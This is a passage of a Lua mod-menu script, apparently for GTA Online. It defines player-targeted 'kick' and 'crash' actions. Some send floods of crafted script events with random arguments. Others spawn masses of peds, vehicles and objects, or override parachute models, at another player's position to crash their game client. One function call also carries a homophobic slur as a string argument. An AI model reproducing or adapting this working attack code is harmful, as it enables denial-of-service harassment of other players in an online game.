    menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(players.user()))
    cwash_in_progwess()
    util.yield(500)
    for i = 1, math.random(10000, 12000) do
    end
    local crash_compiled_func = load(crash_str .. '\"' .. cur_crash_meth .. PLAYER.GET_PLAYER_NAME(pid) .. '\")')
    pcall(crash_compiled_func)
    util.toast('see you again')
end)

kick2_ref:action("AIO kick.", {"aiok", "aiokick"}, "If 'slower, but better aio' is enabled in lobby features, then uses it here as well.", function ()
    if pid == players.user() then
        util.toast('Dont try to Kick yourself, idiot')
        return
    end
    util.trigger_script_event(1 << pid, {0x37437C28, 1, 15, math.random(-2147483647, 2147483647)})
    wait(10) 
    util.trigger_script_event(1 << pid, {-1308840134, 1, 15, math.random(-2147483647, 2147483647)})
    wait(10) 
    util.trigger_script_event(1 << pid, {0x4E0350C6, 1, 15, math.random(-2147483647, 2147483647)})
    wait(10) 
    util.trigger_script_event(1 << pid, {-0x114C63AC, 1, 15, math.random(-2147483647, 2147483647)})
    wait(10) 
    util.trigger_script_event(1 << pid, {-0x15F5B1D4, 1, 15, math.random(-2147483647, 2147483647)})
    wait(10) 
    util.trigger_script_event(1 << pid, {-0x249FE11B, 1, 15, math.random(-2147483647, 2147483647)})
    wait(10) 
    util.trigger_script_event(1 << pid, {-0x76B11968, 1, 15, math.random(-2147483647, 2147483647)})
    wait(10) 
    util.trigger_script_event(1 << pid, {0x9C050EC, 1, 15, math.random(-2147483647, 2147483647)})
    wait(10) 
    util.trigger_script_event(1 << pid, {0x3B873479, 1, 15, math.random(-2147483647, 2147483647)})
    wait(10) 
    util.trigger_script_event(1 << pid, {0x23F74138, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
    wait(10) 
    util.trigger_script_event(1 << pid, {0xAD63290E, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
    wait(10)
    util.trigger_script_event(1 << pid, {0x39624029, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
    wait(10) 
    util.trigger_script_event(1 << pid, {-0x529CD6F2, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
    wait(10) 
    util.trigger_script_event(1 << pid, {-0x756DBC8A, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
    wait(10) 
    util.trigger_script_event(1 << pid, {-0x69532BA0, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
    wait(10) 
    util.trigger_script_event(1 << pid, {0x68C5399F, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
    wait(10) 
    util.trigger_script_event(1 << pid, {0x7DE8CAC0, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
    wait(10) 
    util.trigger_script_event(1 << pid, {0x285DDF33, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
    wait(10) 
    util.trigger_script_event(1 << pid, {-0x177132B8, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
    wait(10)
    util.trigger_script_event(1 << pid, {memory.script_global(1893548 + (1 + (pid * 600) + 511)), pid})
    for a = -1, 1 do
        for n = -1, 1 do
            util.trigger_script_event(1 << pid, {-65587051, 28, a, n})
            wait(10)
        end
    end
    for a = -1, 1 do
        for n = -1, 1 do
            util.trigger_script_event(1 << pid, {1445703181, 28, a, n})
            wait(10)
        end
    end
    if TXC_SLOW then
        wait(10)
        util.trigger_script_event(1 << pid, {-290218924, -32190, -71399, 19031, 85474, 4468, -2112})
        wait(10)
        util.trigger_script_event(1 << pid, {-227800145, -1000000, -10000000, -100000000, -100000000, -100000000})
        wait(10)
        util.trigger_script_event(1 << pid, {2002459655, -1000000, -10000, -100000000})
        wait(10)
        util.trigger_script_event(1 << pid, {911179316, -38, -30, -75, -59, 85, 82})
        wait(10)
        util.trigger_script_event(1 << pid, {-290218924, -32190, -71399, 19031, 85474, 4468, -2112})
        wait(10)
        util.trigger_script_event(1 << pid, {-1386010354, 91645, -99683, 1788, 60877, 55085, 72028})
        wait(10)
        util.trigger_script_event(1 << pid, {-227800145, -1000000, -10000000, -100000000, -100000000, -100000000})
        wait(10)
        for g = -28, 0 do
            for n = -1, 1 do
                for a = -1, 1 do
                    util.trigger_script_event(1 << pid, {1445703181, g, n, a})
                end
            end
            wait(10)
        end
        for a = -11, 11 do
            util.trigger_script_event(1 << pid, {2002459655, -1000000, a, -100000000})
        end
        for a = -10, 10 do
            for n = 30, -30 do
                util.trigger_script_event(1 << pid, {911179316, a, n, -75, -59, 85, 82})
            end
        end
        for a = -10, 10 do
            util.trigger_script_event(1 << pid, {-65587051, a, -1, -1})
        end
        util.trigger_script_event(1 << pid, {951147709, pid, 1000000, nil, nil}) 
        for a = -10, 10 do
            util.trigger_script_event(1 << pid, {-1949011582, a, 1518380048})
        end
        for a = -10, 4 do
            for n = -10, 5 do
                util.trigger_script_event(1 << pid, {1445703181, 28, a, n})
            end
        end
    end
    notification.darkgreen("Successfully sent AIO kick to ~r~" .. PLAYER.GET_PLAYER_NAME(pid) .. "~w~")
end)

kick2_ref:action("Adaptive kick", {}, "", function()
    if pid == players.user() then
        util.toast('Dont try to Kick yourself, idiot')
        return
    end
    menu.trigger_commands("scripthost")
    util.trigger_script_event(1 << pid, {1104117595, pid, 1, 0, 2, 14, 3, 1})
    util.trigger_script_event(1 << pid, {1104117595, pid, 1, 0, 2, 167, 3, 1})
    util.trigger_script_event(1 << pid, {1104117595, pid, 1, 0, 2, 257, 3, 1})
end)

kick2_ref:action("Script kick v1", {}, "", function()
    if pid == players.user() then
        util.toast('Dont try to Kick yourself, idiot')
        return
    end
    util.trigger_script_event(1 << pid, {1104117595, pid, 1, 0, 2, math.random(14, 267), 3, 1})
    util.trigger_script_event(1 << pid, {697566862, pid, 0x4, -1, 1, 1, 1})
    util.trigger_script_event(1 << pid, {1268038438, pid, memory.script_global(2657589 + 1 + (pid * 466) + 321 + 8)}) 
    util.trigger_script_event(1 << pid, {915462795, players.user(), memory.read_int(memory.script_global(0x1CE15F + 1 + (pid * 0x257) + 0x1FE))})
    util.trigger_script_event(1 << pid, {697566862, pid, 0x4, -1, 1, 1, 1})
    util.trigger_script_event(1 << pid, {1268038438, pid, memory.script_global(2657589 + 1 + (pid * 466) + 321 + 8)})
    util.trigger_script_event(1 << pid, {915462795, players.user(), memory.read_int(memory.script_global(1894573 + 1 + (pid * 608) + 510))})
    menu.trigger_commands("givesh" .. players.get_name(pid))
end)

----------------------------------------------------------------------------------------CRASHES-----------------------------------------------------------------------------------------------------------------------

crash2_ref:action("Fragment Crash", {"2take1"}, "skidded lol", function ()
    requestModel(fragment)
    menu.trigger_commands("spectate" .. players.get_name(pid) .. " on")
    wait(100)
    local cord = getEntityCoords(getPlayerPed(pid))
    local a1 = entities.create_object(310817095, cord)
    local a2 = entities.create_object(310817095, cord)
    local a3 = entities.create_object(310817095, cord)
    local b1 = entities.create_object(310817095, cord)
    local b2 = entities.create_object(310817095, cord)
    local b3 = entities.create_object(310817095, cord)
    wait(100)
    menu.trigger_commands("ragdoll" .. players.get_name(pid) .. " on")
    wait(6500)
    menu.trigger_commands("ragdoll" .. players.get_name(pid) .. " off")
    menu.trigger_commands("spectate" .. players.get_name(pid) .. " off")
    entities.delete_by_handle(a1)
    entities.delete_by_handle(a2)
    entities.delete_by_handle(a3)
    entities.delete_by_handle(b1)
    entities.delete_by_handle(b2)--]]
    entities.delete_by_handle(b3)
end)

crash2_ref:action("Motorcycle jesus", {"crashv18"}, "Skid from x-force", function()
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = players.get_position(pid)
    local mdl = util.joaat("u_m_m_jesus_01")
    local veh_mdl = util.joaat("oppressor")
    util.request_model(veh_mdl)
    util.request_model(mdl)
        for i = 1, 10 do
            if not players.exists(pid) then
                return
            end
            local veh = entities.create_vehicle(veh_mdl, pos, 0)
            local jesus = entities.create_ped(2, mdl, pos, 0)
            PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
            util.yield(100)
            TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
            util.yield(1000)
            entities.delete_by_handle(jesus)
            entities.delete_by_handle(veh)
        end
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
end)

local pclpid = {}

crash2_ref:action( "Clone Crash", {"crashv28"}, "Clones the player repeatedly until he crashes LMFAO", function()
    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local c = ENTITY.GET_ENTITY_COORDS(p)
    for i = 1, 23 do
        local pclone = entities.create_ped(26, ENTITY.GET_ENTITY_MODEL(p), c, 0)
        pclpid [#pclpid + 1] = pclone 
        PED.CLONE_PED_TO_TARGET(p, pclone)
    end
    local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
    all_peds = entities.get_all_peds_as_handles()
    local last_ped = 0
    local last_ped_ht = 0
    for k,ped in pairs(all_peds) do
        if not PED.IS_PED_A_PLAYER(ped) and not PED.IS_PED_FATALLY_INJURED(ped) then
            ryze.get_control_request(ped)
            if PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                TASK.TASK_LEAVE_ANY_VEHICLE(ped, 0, 16)
            end

            ENTITY.DETACH_ENTITY(ped, false, false)
            if last_ped ~= 0 then
                ENTITY.ATTACH_ENTITY_TO_ENTITY(ped, last_ped, 0, 0.0, 0.0, last_ped_ht-0.5, 0.0, 0.0, 0.0, false, false, false, false, 0, false)
            else
                ENTITY.SET_ENTITY_COORDS(ped, c.x, c.y, c.z)
            end
            last_ped = ped
        end
    end
end)

crash2_ref:action("Poodle Crash", {}, "", function()
      local coords = players.get_position(pid)
      coords.x = coords['x']
      coords.y = coords['y']
      coords.z = coords['z']
      local pos = v3.new(coords.x, coords.y, coords.z)
       local coords = players.get_position(pid)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local heading = ENTITY.GET_ENTITY_HEADING(ped)

        local poodle1 = util.joaat("a_c_poodle")
         util.request_model(poodle1)
          local ent1 = entities.create_ped(26, poodle1, coords, heading)
          local poodle2 = util.joaat("a_c_poodle")
          util.request_model(poodle2)
          local ent2 = entities.create_ped(21, poodle2, coords, heading)
          
          WEAPON.GIVE_WEAPON_TO_PED(ent1, -581044007, 1, false, true)
          WEAPON.GIVE_WEAPON_TO_PED(ent2, -581044007, 1, false, true)
          WEAPON.SET_CURRENT_PED_WEAPON(ent1, -581044007, true)
          WEAPON.SET_CURRENT_PED_WEAPON(ent2, -581044007, true)
          local pcoords = ENTITY.GET_ENTITY_COORDS(ent2, true)
          pcoords.z = pcoords['z'] + 0.5
          FIRE.ADD_EXPLOSION(pcoords.x, pcoords.y, pcoords.z, 12, 100, false, true, 0, false)

           local OB1 = entities.create_object(0x34315488, coords, heading)
           ENTITY.ATTACH_ENTITY_TO_ENTITY(OB1, ped, 0, 0, 0, 0, 0, 0, 0, true, true, false, true, 0, true, 2) 

           entities.create_object(OB1, pcoords, heading)

           local VH1 = util.joaat("speedo2")
           ENTITY.ATTACH_ENTITY_TO_ENTITY(VH1, ped, 0, 0, 0, 0, 0, 0, 0, true, true, false, true, 0, true, 2) 
           local VH2 = util.joaat("nero2")
           ENTITY.ATTACH_ENTITY_TO_ENTITY(VH2, ped, 0, 0, 0, 0, 0, 0, 0, true, true, false, true, 0, true, 2) 
           local VH3 = util.joaat("speedo2")
           ENTITY.ATTACH_ENTITY_TO_ENTITY(VH3, ped, 0, 0, 0, 0, 0, 0, 0, true, true, false, true, 0, true, 2) 
           local VH4 = util.joaat("youga3")
           ENTITY.ATTACH_ENTITY_TO_ENTITY(VH4, ped, 0, 0, 0, 0, 0, 0, 0, true, true, false, true, 0, true, 2) 
           local VH5 = util.joaat("speedo2")
           ENTITY.ATTACH_ENTITY_TO_ENTITY(VH5, ped, 0, 0, 0, 0, 0, 0, 0, true, true, false, true, 0, true, 2) 
           local VH6 = util.joaat("burrito4")
           ENTITY.ATTACH_ENTITY_TO_ENTITY(VH6, ped, 0, 0, 0, 0, 0, 0, 0, true, true, false, true, 0, true, 2) 
           local VH7 = util.joaat("speedo2")
           ENTITY.ATTACH_ENTITY_TO_ENTITY(VH7, ped, 0, 0, 0, 0, 0, 0, 0, true, true, false, true, 0, true, 2) 
           local VH8 = util.joaat("nero2")
           ENTITY.ATTACH_ENTITY_TO_ENTITY(VH8, ped, 0, 0, 0, 0, 0, 0, 0, true, true, false, true, 0, true, 2) 
           local VH9 = util.joaat("speedo2")
           ENTITY.ATTACH_ENTITY_TO_ENTITY(VH9, ped, 0, 0, 0, 0, 0, 0, 0, true, true, false, true, 0, true, 2) 
          local VH10 = util.joaat("youga3")
           ENTITY.ATTACH_ENTITY_TO_ENTITY(VH10, ped, 0, 0, 0, 0, 0, 0, 0, true, true, false, true, 0, true, 2) 
           local VH11 = util.joaat("speedo2")
           ENTITY.ATTACH_ENTITY_TO_ENTITY(VH11, ped, 0, 0, 0, 0, 0, 0, 0, true, true, false, true, 0, true, 2) 
          local VH12 = util.joaat("burrito4")
           ENTITY.ATTACH_ENTITY_TO_ENTITY(VH12, ped, 0, 0, 0, 0, 0, 0, 0, true, true, false, true, 0, true, 2) 
           local Tcoords = v3.new(pcoords.x, pcoords.y, pcoords.z)

           entities.create_object(VH1, Tcoords, heading)
           entities.create_object(VH2, Tcoords, heading)
           entities.create_object(VH3, Tcoords, heading)
           entities.create_object(VH4, Tcoords, heading)
           entities.create_object(VH5, Tcoords, heading)
           entities.create_object(VH6, Tcoords, heading)
           entities.create_object(VH7, Tcoords, heading)
           entities.create_object(VH8, Tcoords, heading)
           entities.create_object(VH9, Tcoords, heading)
           entities.create_object(VH10, Tcoords, heading)
           entities.create_object(VH11, Tcoords, heading)
           entities.create_object(VH12, Tcoords, heading)

           util.yield(3000)
           menu.trigger_commands("cleararea")
end)

crash2_ref:action("Cars Crash", {"crashv13"}, "", function(on_toggle)
    local hashes = {1492612435, 3517794615, 3889340782, 3253274834}
    local vehicles = {}
    for i = 1, 4 do
        util.create_thread(function()
            ryze.request_model(hashes[i])
            local pcoords = players.get_position(pid)
            local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x, pcoords.y, pcoords.z, math.random(0, 360), true, true, false)
            for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
            VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
            for j = 0, 49 do
                local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1
                VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
                VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
            end
            for j = 0, 20 do
                if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
            end
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
            VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
            for ai = 1, 50 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                pcoords = players.get_position(pid)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, pcoords.x, pcoords.y, pcoords.z, false, false, false)
                util.yield()
            end
            vehicles[#vehicles+1] = veh
        end)
    end
    util.yield(2000)
    for _, v in pairs(vehicles) do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(v)
        entities.delete_by_handle(v)
    end
end)

crash2_ref:action("DADDY Crash", {"crashv27"}, "X-Force Big Chungus (use before 5G)", function()
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
    local mdl = util.joaat("A_C_Cat_01")
    local mdl2 = util.joaat("U_M_Y_Zombie_01")
    local mdl3 = util.joaat("A_F_M_ProlHost_01")
    local mdl4 = util.joaat("A_M_M_SouCent_01")
    local veh_mdl = util.joaat("insurgent2")
    local veh_mdl2 = util.joaat("brawler")
    local animation_tonta = ("anim@mp_player_intupperstinker")
    ryze.anim_request(animation_tonta)
    util.request_model(veh_mdl)
    util.request_model(veh_mdl2)
    util.request_model(mdl)
    util.request_model(mdl2)
    util.request_model(mdl3)
    util.request_model(mdl4)
    for i = 1, 20 do
        local ped1 = entities.create_ped(1, mdl, pos, 0)
        local ped_ = entities.create_ped(1, mdl2, pos, 0)
        local ped3 = entities.create_ped(1, mdl3, pos, 0)
        local ped3 = entities.create_ped(1, mdl4, pos, 0)
        local veh = entities.create_vehicle(veh_mdl, pos, 0)
        local veh2 = entities.create_vehicle(veh_mdl2, pos, 0)
        util.yield(100)
        PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
        PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)

        PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
        PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)

        PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
        PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)

        PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
        PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)
        
        PED.SET_PED_INTO_VEHICLE(mdl3, veh, -1)
        PED.SET_PED_INTO_VEHICLE(mdl3, veh2, -1)

        PED.SET_PED_INTO_VEHICLE(mdl4, veh, -1)
        PED.SET_PED_INTO_VEHICLE(mdl4, veh2, -1)

        TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)

        TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh2, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh2, ped, 10.0, 0, 10, 0, 0)

        TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)

        PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 2, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 1, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 0, 0)
        
        PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 2, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 1, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 0, 0)

        TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl, animation_tonta, 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl, animation_tonta, 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl, animation_tonta, 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, animation_tonta, 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl4, animation_tonta, 0, false)

        ENTITY.SET_ENTITY_HEALTH(mdl, false, 200)
        ENTITY.SET_ENTITY_HEALTH(mdl2, false, 200)
        ENTITY.SET_ENTITY_HEALTH(mdl3, false, 200)
        ENTITY.SET_ENTITY_HEALTH(mdl4, false, 200)

        PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, animation_tonta, 0, false)
        PED.SET_PED_INTO_VEHICLE(mdl, veh, -1)
        PED.SET_PED_INTO_VEHICLE(mdl2, veh, -1)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, animation_tonta, 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, animation_tonta, 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, animation_tonta, 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, animation_tonta, 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, animation_tonta, 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, animation_tonta, 0, false)
        util.yield(200)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, animation_tonta, 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, animation_tonta, 0, false)
    end
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl2)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl2)
    entities.delete_by_handle(mdl)
    entities.delete_by_handle(mdl2)
    entities.delete_by_handle(mdl3)
    entities.delete_by_handle(mdl4)
    entities.delete_by_handle(veh_mdl)
    entities.delete_by_handle(veh_mdl2)
end)


local peds = 5
krustykrab:slider("Number of spatulas", {}, "sends spatules ah~", 1, 45, 1, 1, function(amount)
    util.toast(players.get_name(pid).. " Has spatulas being sent to him/her")
    peds = amount
end)

local crash_ents = {}
local crash_toggle = false
krustykrab:toggle("Number of spatulas", {}, "Spectating is risky, watch out.", function(val)
    util.toast(players.get_name(pid).. " Has spatulas being sent to him/her")
    local crash_toggle = val
    ryze.BlockSyncs(pid, function()
        if val then
            local number_of_peds = peds
            local ped_mdl = util.joaat("ig_siemonyetarian")
            local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local ped_pos = players.get_position(pid)
            ped_pos.z += 3
            ryze.request_model(ped_mdl)
            for i = 1, number_of_peds do
                local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                crash_ents[i] = ped
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                ENTITY.SET_ENTITY_VISIBLE(ped, false)
            end
            repeat
                for k, ped in crash_ents do
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(ped, "PROP_HUMAN_BBQ", 0, false)
                end
                for k, v in entities.get_all_objects_as_pointers() do
                    if entities.get_model_hash(v) == util.joaat("prop_fish_slice_01") then
                        entities.delete_by_pointer(v)
                    end
                end
                util.yield_once()
                util.yield_once()
            until not (crash_toggle and players.exists(pid))
            crash_toggle = false
            for k, obj in crash_ents do
                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        else
            for k, obj in crash_ents do
                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        end
    end)
end)

crash2_ref:action("Cherax Crash", {}, "Old Yum YUm.", function()
    local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local mdl = util.joaat("cs_taostranslator2")
    while not STREAMING.HAS_MODEL_LOADED(mdl) do
        STREAMING.REQUEST_MODEL(mdl)
        util.yield(5)
    end

    local ped = {}
    for i = 1, 10 do 
        local coord = ENTITY.GET_ENTITY_COORDS(player, true)
        local pedcoord = ENTITY.GET_ENTITY_COORDS(ped[i], false)
        ped[i] = entities.create_ped(0, mdl, coord, 0)

        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(ped[i], 0xB1CA77B1, 0, true)
        WEAPON.SET_PED_GADGET(ped[i], 0xB1CA77B1, true)

        menu.trigger_commands("as ".. PLAYER.GET_PLAYER_NAME(pid) .. " explode " .. PLAYER.GET_PLAYER_NAME(pid) .. " ")

        ENTITY.SET_ENTITY_VISIBLE(ped[i], true)
        util.yield(25)
    end
    util.yield(2500)
    for i = 1, 10 do
        entities.delete_by_handle(ped[i])
        util.yield(25)
    end

end)

crash2_ref:action("Task crash", {}, "Powerful crash.", function()
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local user = PLAYER.GET_PLAYER_PED(players.user())
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    local my_pos = ENTITY.GET_ENTITY_COORDS(user)
    local anim_dict = ("anim@mp_player_intupperstinker")
    ryze.anim_request(anim_dict)
    ryze.BlockSyncs(pid, function()
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
        util.yield(100)
        TASK.TASK_SWEEP_AIM_POSITION(user, anim_dict, "take that", "stupid", "faggot", -1, 0.0, 0.0, 0.0, 0.0, 0.0)
        util.yield(100)
    end)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, my_pos.x, my_pos.y, my_pos.z, false, false, false)

end)

crash2_ref:action("Weed crash", {"crashv14"}, "", function()
    local cord = players.get_position(pid)
    local a1 = entities.create_object(-930879665, cord)
    local a2 = entities.create_object(3613262246, cord)
    local b1 = entities.create_object(452618762, cord)
    local b2 = entities.create_object(3613262246, cord)
    for i = 1, 10 do
        util.request_model(-930879665)
        util.yield(10)
        util.request_model(3613262246)
        util.yield(10)
        util.request_model(452618762)
        util.yield(300)
        entities.delete_by_handle(a1)
        entities.delete_by_handle(a2)
        entities.delete_by_handle(b1)
        entities.delete_by_handle(b2)
        util.request_model(452618762)
        util.yield(10)
        util.request_model(3613262246)
        util.yield(10)
        util.request_model(-930879665)
        util.yield(10)
    end
    util.toast("Finished.")
end)

menu.action(nmcrashes, "Yatch V1", {"bigyachtyv1"}, "Crash event (A1:EA0FF6AD) sending prop yatch.", function()
    local user = PLAYER.GET_PLAYER_PED(players.user())
    local model = util.joaat("h4_yacht_refproxy")
    local pos = players.get_position(pid)
    local oldPos = players.get_position(players.user())
    ryze.BlockSyncs(pid, function()
        util.yield(100)
        ENTITY.SET_ENTITY_VISIBLE(user, false)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
        PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
        util.yield(500)
        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
        util.yield(2500)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
        for i = 1, 5 do
            util.spoof_script("freemode", SYSTEM.WAIT)
        end
        ENTITY.SET_ENTITY_HEALTH(user, 0)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
        ENTITY.SET_ENTITY_VISIBLE(user, true)
    end)
end)

menu.action(nmcrashes, "Yatch V2", {"bigyachtyv2"}, "Crash event (A1:E8958704) sending prop yacht001.", function()
    local user = PLAYER.GET_PLAYER_PED(players.user())
    local model = util.joaat("h4_yacht_refproxy001")
    local pos = players.get_position(pid)
    local oldPos = players.get_position(players.user())
    ryze.BlockSyncs(pid, function()
        util.yield(100)
        ENTITY.SET_ENTITY_VISIBLE(user, false)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
        PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
        util.yield(500)
